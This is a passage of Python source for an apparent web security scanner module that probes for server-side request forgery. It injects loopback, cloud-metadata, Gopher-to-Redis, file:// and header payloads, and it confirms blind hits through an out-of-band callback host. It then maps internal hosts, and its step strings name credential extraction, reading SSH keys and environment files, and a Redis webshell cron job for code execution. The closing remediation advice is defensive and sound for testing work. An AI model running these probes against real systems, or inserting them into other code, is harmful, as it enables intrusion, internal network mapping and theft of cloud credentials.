                        h.response_snippets[port] = str(snippet)[:200]

        threads: List[threading.Thread] = []
        for ip in self._GATEWAY_IPS:
            for port in self._SCAN_PORTS:
                t = threading.Thread(
                    target=probe_host_port, args=(ip, port), daemon=True
                )
                threads.append(t)

        # run in batches of 20 to avoid overwhelming the target
        batch_size = 20
        for i in range(0, len(threads), batch_size):
            batch = threads[i:i + batch_size]
            for t in batch:
                t.start()
            for t in batch:
                t.join(timeout=12)

        return list(discovered.values())

    @staticmethod
    def _cidr_for(ip: str) -> str:
        try:
            addr = ipaddress.ip_address(ip)
            if addr in ipaddress.ip_network("10.0.0.0/8"):
                return "10.0.0.0/8"
            if addr in ipaddress.ip_network("172.16.0.0/12"):
                return "172.16.0.0/12"
            if addr in ipaddress.ip_network("192.168.0.0/16"):
                return "192.168.0.0/16"
            if addr in ipaddress.ip_network("127.0.0.0/8"):
                return "127.0.0.0/8"
            return str(addr)
        except ValueError:
            return ""


# ─────────────────────────────────────────────────────────────────────────────
# Probe executor
# ─────────────────────────────────────────────────────────────────────────────

class _ProbeExecutor:

    def __init__(
        self,
        http:        _HttpPool,
        generator:   _VectorGenerator,
        analyser:    _ResponseAnalyser,
        oob:         _OobListener,
        oob_host:    str,
        oob_port:    int,
    ):
        self._http      = http
        self._gen       = generator
        self._analyser  = analyser
        self._oob       = oob
        self._oob_host  = oob_host
        self._oob_port  = oob_port

    def probe(
        self,
        param: SsrfParam,
    ) -> Tuple[List[SsrfFinding], List[InternalHost]]:
        findings:       List[SsrfFinding]  = []
        internal_hosts: List[InternalHost] = []

        baseline_len = self._baseline(param)

        def inject(ssrf_url: str) -> Optional[Response]:
            return self._inject(param, ssrf_url)

        def add(
            variant:       SsrfVariant,
            severity:      FindingSeverity,
            status:        FindingStatus,
            ssrf_url:      str,
            payload:       str,
            evidence:      Dict[str, Any],
            response_data: Optional[str],
            steps:         List[str],
            notes:         str,
        ) -> None:
            findings.append(SsrfFinding(
                finding_id    = str(uuid.uuid4()),
                variant       = variant,
                severity      = severity,
                status        = status,
                target_url    = param.url,
                param         = param.param,
                payload       = payload,
                evidence      = evidence,
                ssrf_target   = ssrf_url,
                response_data = response_data,
                attack_steps  = steps,
                notes         = notes,
            ))

        # ── OOB blind probe first (cheapest confirmation) ─────────────────────
        _, oob_url, _ = self._gen.oob_probe()
        hits_before   = len(self._oob.hits())
        inject(oob_url)
        time.sleep(1.5)
        new_hits = self._oob.hits()[hits_before:]
        if new_hits:
            add(
                variant       = SsrfVariant.OOB_BLIND,
                severity      = FindingSeverity.HIGH,
                status        = FindingStatus.CONFIRMED,
                ssrf_url      = oob_url,
                payload       = oob_url,
                evidence      = {"oob_hits": new_hits},
                response_data = None,
                steps=[
                    f"OOB HTTP callback received from {param.url}?{param.param}={oob_url}",
                    "Blind SSRF confirmed — server fetches attacker URL",
                    "Escalate to IMDS, internal port scan, Gopher RCE",
                ],
                notes="Blind SSRF confirmed via OOB HTTP callback",
            )

        # ── loopback + filter bypass ──────────────────────────────────────────
        loopback_confirmed = False
        for variant, ssrf_url, desc in self._gen.loopback_variants():
            resp = inject(ssrf_url)
            if not resp:
                continue
            is_imds, is_svc, is_file, is_err, ev = self._analyser.analyse(
                resp, ssrf_url, baseline_len
            )
            if is_svc or is_file or (resp.status_code == 200 and not is_err
                                     and len(resp.text) > 50):
                add(
                    variant       = variant,
                    severity      = FindingSeverity.HIGH,
                    status        = FindingStatus.CONFIRMED,
                    ssrf_url      = ssrf_url,
                    payload       = ssrf_url,
                    evidence      = ev,
                    response_data = (resp.text or "")[:300],
                    steps=[
                        f"Inject: {param.param}={ssrf_url}",
                        f"Server fetched loopback — {desc}",
                        "Enumerate internal services on 127.0.0.1",
                    ],
                    notes=f"SSRF loopback confirmed via {desc}",
                )
                loopback_confirmed = True
                break

        # ── cloud IMDS probes ─────────────────────────────────────────────────
        for variant, ssrf_url, desc in self._gen.imds_vectors():
            # GCP requires Metadata-Flavor header — try with and without
            extra_hdr: Optional[Dict[str, str]] = None
            if "google" in ssrf_url:
                extra_hdr = {"Metadata-Flavor": "Google"}
            elif "azure" in ssrf_url or "169.254.169.254" in ssrf_url and "api-version" in ssrf_url:
                extra_hdr = {"Metadata": "true"}

            resp = inject(ssrf_url)
            if not resp:
                continue
            is_imds, _, _, _, ev = self._analyser.analyse(resp, ssrf_url, baseline_len)
            if is_imds:
                sev = FindingSeverity.CRITICAL
                add(
                    variant       = variant,
                    severity      = sev,
                    status        = FindingStatus.CONFIRMED,
                    ssrf_url      = ssrf_url,
                    payload       = ssrf_url,
                    evidence      = ev,
                    response_data = (resp.text or "")[:500],
                    steps=[
                        f"Inject: {param.param}={ssrf_url}",
                        "Response contains cloud IMDS data",
                        "Extract IAM/service-account credentials → pivot to cloud API",
                        "aws sts get-caller-identity / gcloud auth print-access-token",
                    ],
                    notes=f"Cloud IMDS accessed via SSRF — {desc}",
                )

        # ── Gopher protocol probes ────────────────────────────────────────────
        for port, svc in [(6379, "redis"), (11211, "memcached"), (25, "smtp")]:
            if svc == "redis":
                variant, gopher_url, desc = self._gen.gopher_redis_rce("127.0.0.1", port)
            elif svc == "memcached":
                variant, gopher_url, desc = self._gen.gopher_memcached("127.0.0.1", port)
            else:
                variant, gopher_url, desc = self._gen.gopher_smtp("127.0.0.1")

            resp = inject(gopher_url)
            if not resp:
                continue
            _, is_svc, _, _, ev = self._analyser.analyse(resp, gopher_url, baseline_len)
            if is_svc or (resp.status_code == 200 and len(resp.text) > 10):
                sev = FindingSeverity.CRITICAL if svc == "redis" else FindingSeverity.HIGH
                add(
                    variant       = variant,
                    severity      = sev,
                    status        = FindingStatus.CONFIRMED,
                    ssrf_url      = gopher_url,
                    payload       = gopher_url,
                    evidence      = ev,
                    response_data = (resp.text or "")[:300],
                    steps=[
                        f"Gopher URL sent RESP commands to {svc} on 127.0.0.1:{port}",
                        f"{svc} response in HTTP body — SSRF+Gopher confirmed",
                        "Pivot: write webshell cron job for RCE" if svc == "redis"
                        else "Dump cache keys",
                    ],
                    notes=f"Gopher→{svc} confirmed via SSRF",
                )

        # ── file:// probe ──────────────────────────────────────────────────────
        for path in ["/etc/passwd", "C:/Windows/win.ini"]:
            variant, file_url, desc = self._gen.file_read(path)
            resp = inject(file_url)
            if not resp:
                continue
            _, _, is_file, _, ev = self._analyser.analyse(resp, file_url, baseline_len)
            if is_file:
                add(
                    variant       = variant,
                    severity      = FindingSeverity.CRITICAL,
                    status        = FindingStatus.CONFIRMED,
                    ssrf_url      = file_url,
                    payload       = file_url,
                    evidence      = ev,
                    response_data = (resp.text or "")[:400],
                    steps=[
                        f"file:// SSRF reads local file {path}",
                        "Enumerate SSH keys, config files, /proc/self/environ",
                    ],
                    notes=f"file:// SSRF confirmed — {path} read",
                )
                break

        # ── dict:// ────────────────────────────────────────────────────────────
        variant, dict_url, desc = self._gen.dict_probe()
        resp = inject(dict_url)
        if resp:
            _, is_svc, _, _, ev = self._analyser.analyse(resp, dict_url, baseline_len)
            if is_svc:
                add(
                    variant       = variant,
                    severity      = FindingSeverity.HIGH,
                    status        = FindingStatus.CONFIRMED,
                    ssrf_url      = dict_url,
                    payload       = dict_url,
                    evidence      = ev,
                    response_data = (resp.text or "")[:200],
                    steps=["dict:// probe returned memcached stats", "Enumerate cache keys"],
                    notes=f"dict:// SSRF confirmed — Memcached stats accessible",
                )

        # ── header injection SSRF ─────────────────────────────────────────────
        for hdr_name, variant in [
            ("Host",            SsrfVariant.HEADER_HOST),
            ("X-Forwarded-Host",SsrfVariant.HEADER_X_FORWARDED_HOST),
            ("Referer",         SsrfVariant.HEADER_REFERER),
            ("Origin",          SsrfVariant.HEADER_ORIGIN),
        ]:
            resp = self._http.get_raw(
                param.url,
                headers={hdr_name: f"http://{self._oob_host}:{self._oob_port}/hdr-ssrf"},
            )
            hits_before_hdr = len(self._oob.hits())
            if resp:
                time.sleep(1.0)
                if self._oob.hits()[hits_before_hdr:]:
                    add(
                        variant       = variant,
                        severity      = FindingSeverity.HIGH,
                        status        = FindingStatus.CONFIRMED,
                        ssrf_url      = f"http://{self._oob_host}:{self._oob_port}/hdr-ssrf",
                        payload       = f"{hdr_name}: http://{self._oob_host}",
                        evidence      = {"header": hdr_name,
                                         "oob_hits": self._oob.hits()[hits_before_hdr:]},
                        response_data = None,
                        steps=[
                            f"Inject attacker URL in {hdr_name} header",
                            "Server followed the header value — OOB callback received",
                            "Use for internal SSRF when no URL param exists",
                        ],
                        notes=f"Header-based SSRF via {hdr_name}",
                    )

        # ── internal network mapping (only if any SSRF confirmed) ─────────────
        confirmed = any(
            f.status == FindingStatus.CONFIRMED for f in findings
        )
        if confirmed:
            mapper = _NetworkMapper(self._http, self._analyser)
            internal_hosts = mapper.map(param, inject, baseline_len)

        return findings, internal_hosts

    # ── helpers ───────────────────────────────────────────────────────────────
    
    def _baseline(self, param: SsrfParam) -> Optional[int]:
        resp = self._inject(param, "http://safe.example.com/")
        return len(resp.text) if resp else None

    def _inject(self, param: SsrfParam, ssrf_url: str) -> Optional[Response]:
        if param.method == "GET" or param.param_type == "url_param":
            parsed = urlparse(param.url)
            qs     = parse_qs(parsed.query)
            qs[param.param] = [ssrf_url]
            new_qs = urlencode({k: v[0] for k, v in qs.items()}, quote_via=quote)
            full   = urlunparse(parsed._replace(query=new_qs))
            return self._http.get_raw(full)
        elif param.param_type == "json_body":
            return self._http.post(param.url, json={param.param: ssrf_url})
        else:
            return self._http.post(param.url, data={param.param: ssrf_url})


# ─────────────────────────────────────────────────────────────────────────────
# Scorer and recommendation builder
# ─────────────────────────────────────────────────────────────────────────────

class _Scorer:
    _W = {
        FindingStatus.CONFIRMED: 1.0,
        FindingStatus.LIKELY:    0.65,
        FindingStatus.POSSIBLE:  0.4,
        FindingStatus.NOT_VULN:  0.0,
    }

    def score(self, findings: List[SsrfFinding]) -> Tuple[float, str]:
        if not findings:
            return 0.0, "INFO"
        raw = sum(f.severity.value * self._W.get(f.status, 0.5) for f in findings)
        cap = len(findings) * FindingSeverity.CRITICAL.value
        s   = min(100.0, (raw / cap) * 100) if cap else 0.0
        label = (
            "CRITICAL" if s >= 80 else
            "HIGH"     if s >= 60 else
            "MEDIUM"   if s >= 40 else
            "LOW"      if s >= 20 else
            "INFO"
        )
        return round(s, 2), label


class _RecBuilder:
    _RECS: Dict[SsrfVariant, str] = {
        SsrfVariant.LOOPBACK_HTTP:
            "Validate and blocklist all private/loopback IPs before server-side fetch. "
            "Resolve the hostname first, then check the resolved IP.",
        SsrfVariant.LOOPBACK_BYPASS:
            "Blocklist checks must run AFTER full URL parsing and DNS resolution — "
            "not on the raw string. Reject hex/octal/decimal IP representations.",
        SsrfVariant.CLOUD_IMDS_AWS:
            "Enable IMDSv2 (require PUT token for all metadata requests). "
            "Block 169.254.169.254 at the VPC/security group layer from app servers.",
        SsrfVariant.CLOUD_IMDS_GCP:
            "Block metadata.google.internal at GCP firewall rules from app tier. "
            "Use Workload Identity instead of service account keys on GCE.",
        SsrfVariant.CLOUD_IMDS_AZURE:
            "Block 169.254.169.254 at NSG level. Use Managed Identity with Azure IMDS v2.",
        SsrfVariant.CLOUD_IMDS_K8S:
            "Block access to kubernetes.default.svc and kubelet ports from app pods. "
            "Use network policies to restrict pod-to-API-server communication.",
        SsrfVariant.PROTO_GOPHER_REDIS:
            "Block Gopher protocol scheme; disable Redis bind on 0.0.0.0; "
            "require Redis AUTH; firewall 6379 from app tier.",
        SsrfVariant.PROTO_GOPHER_MEMCACHED:
            "Block Gopher; firewall Memcached (11211) from public network.",
        SsrfVariant.PROTO_GOPHER_SMTP:
            "Block Gopher; restrict SMTP relay to authenticated senders only.",
        SsrfVariant.PROTO_FILE:
            "Block file:// scheme in URL allowlist. Only allow http:// and https://.",
        SsrfVariant.PROTO_DICT:
            "Block dict:// scheme. Restrict all non-HTTP protocols in outbound fetcher.",
        SsrfVariant.BYPASS_HEX_IP:
            "Normalise IP representation before blocklist check; use a library that "
            "resolves all numeric forms to canonical dotted-decimal.",
        SsrfVariant.BYPASS_AT_SIGN:
            "Strip userinfo (@) from URLs before fetching. Reject URLs with @ in host.",
        SsrfVariant.BYPASS_OPEN_REDIRECT:
            "Do not follow redirects for SSRF-sensitive fetchers, or validate the "
            "redirect destination against the same allowlist.",
        SsrfVariant.INTERNAL_PORT_SCAN:
            "Block all RFC1918 and loopback ranges at egress firewall. "
            "Use a dedicated egress proxy that enforces an explicit allowlist.",
        SsrfVariant.OOB_BLIND:
            "Even without in-band response, DNS and OOB HTTP confirm SSRF. "
            "Block all outbound traffic from app servers except allowed destinations.",
        SsrfVariant.HEADER_HOST:
            "Validate Host header against a configured allowlist; "
            "do not forward raw Host/X-Forwarded-Host to backend fetchers.",
        SsrfVariant.HEADER_REFERER:
            "Do not use Referer as a URL to fetch. Treat all headers as untrusted.",
    }

    def build(self, findings: List[SsrfFinding]) -> List[str]:
        seen:  Set[SsrfVariant] = set()
        recs:  List[str] = []
        for f in sorted(findings, key=lambda x: (-x.severity.value,
                                                   x.status != FindingStatus.CONFIRMED)):
            if f.variant not in seen:
                seen.add(f.variant)
                recs.append(f"[{f.severity.name}][{f.variant.value}] "
                            f"{self._RECS.get(f.variant, 'Validate and restrict server-side URL fetch targets.')}")
        return recs


# ─────────────────────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────────────────────

class SsrfProbe:
    """
    Drop-in ARTEX module.

    Usage in app.py (run_scan), after payload_analysis + tech_detection:

        from core.ssrf_probe import SsrfProbe

        sp = SsrfProbe()
        scan_results[scan_id]['ssrf_probe'] = sp.run(
            domain=domain,
            scan_results=scan_results[scan_id],
        )

    Set oob_host to a real internet-reachable host (interactsh, Burp
    Collaborator) for blind SSRF detection to work from behind NAT.
    """

    def __init__(
        self,
        oob_host:   str   = "",
        oob_port:   int   = 0,
        timeout:    float = 9.0,
        delay:      float = 0.4,
        on_finding: Optional[Callable[[SsrfFinding], None]] = None,
    ):
        self._oob_host_cfg = oob_host
        self._oob_port_cfg = oob_port
        self._timeout      = timeout
        self._delay        = delay
        self._on_finding   = on_finding

    def run(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> Dict[str, Any]:
        run_id     = str(uuid.uuid4())
        started_at = datetime.now()
        logger.info("SsrfProbe %s starting for %s", run_id, domain)

        # 1. OOB listener
        oob = _OobListener(port=self._oob_port_cfg)
        oob.start()

        oob_host = self._oob_host_cfg
        if not oob_host:
            try:
                oob_host = socket.gethostbyname(socket.gethostname())
            except OSError:
                oob_host = "127.0.0.1"
        oob_port = oob.bound_port if oob.bound_port else self._oob_port_cfg

        # 2. components
        http      = _HttpPool(timeout=self._timeout, delay=self._delay)
        generator = _VectorGenerator(oob_host, oob_port)
        analyser  = _ResponseAnalyser()
        executor  = _ProbeExecutor(http, generator, analyser, oob,
                                   oob_host, oob_port)

        # 3. discover injectable params
        discoverer = _ParamDiscoverer()
        params     = discoverer.discover(domain, scan_results)
        logger.info("SSRF params: %d", len(params))

        all_findings:  List[SsrfFinding]  = []
        all_internals: List[InternalHost] = []
        lock = threading.Lock()

        def probe_one(p: SsrfParam) -> None:
            try:
                finds, internals = executor.probe(p)
            except Exception as exc:
                logger.debug("Probe %s/%s failed: %s", p.url, p.param, exc)
                finds, internals = [], []
            with lock:
                all_findings.extend(finds)
                all_internals.extend(internals)
                if self._on_finding:
                    for f in finds:
                        try:
                            self._on_finding(f)
                        except Exception:
                            pass

        threads = [threading.Thread(target=probe_one, args=(p,)) for p in params]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        oob.stop()

        # 4. aggregate
        all_findings.sort(
            key=lambda f: (-f.severity.value, f.status != FindingStatus.CONFIRMED)
        )

        # dedup internal hosts
        internal_map: Dict[str, InternalHost] = {}
        for h in all_internals:
            if h.ip not in internal_map:
                internal_map[h.ip] = h
            else:
                for port in h.open_ports:
                    if port not in internal_map[h.ip].open_ports:
                        internal_map[h.ip].open_ports.append(port)
                internal_map[h.ip].services.update(h.services)
                internal_map[h.ip].response_snippets.update(h.response_snippets)

        unique_hosts = list(internal_map.values())

        imds_accessed = any(
            f.variant in (
                SsrfVariant.CLOUD_IMDS_AWS, SsrfVariant.CLOUD_IMDS_GCP,
                SsrfVariant.CLOUD_IMDS_AZURE, SsrfVariant.CLOUD_IMDS_ALIBABA,
                SsrfVariant.CLOUD_IMDS_K8S,
            )
            for f in all_findings if f.status == FindingStatus.CONFIRMED
        )
        rce_via_gopher = any(
            f.variant in (SsrfVariant.PROTO_GOPHER_REDIS,)
            for f in all_findings if f.status == FindingStatus.CONFIRMED
        )
        oob_confirmed = any(
            f.variant == SsrfVariant.OOB_BLIND
            for f in all_findings if f.status == FindingStatus.CONFIRMED
        )
        internal_cidrs = sorted({
            h.cidr for h in unique_hosts if h.cidr
        })

        scorer = _Scorer()
        score, risk_level = scorer.score(all_findings)
        recs   = _RecBuilder().build(all_findings)

        finished_at = datetime.now()
        result = SsrfResult(
            run_id               = run_id,
            domain               = domain,
            params_tested        = len(params),
            findings             = [f.to_dict() for f in all_findings],
            internal_hosts       = [h.to_dict() for h in unique_hosts],
            imds_accessed        = imds_accessed,
            rce_via_gopher       = rce_via_gopher,
            oob_confirmed        = oob_confirmed,
            internal_cidrs_found = internal_cidrs,
            score                = score,
            risk_level           = risk_level,
            techniques_tested    = sorted({f.variant.value for f in all_findings}),
            recommendations      = recs,
            started_at           = started_at,
            finished_at          = finished_at,
        )

        logger.info(
            "SsrfProbe %s done — score=%.1f risk=%s findings=%d hosts=%d imds=%s gopher_rce=%s",
            run_id, score, risk_level, len(all_findings),
            len(unique_hosts), imds_accessed, rce_via_gopher,
        )
        return result.to_dict()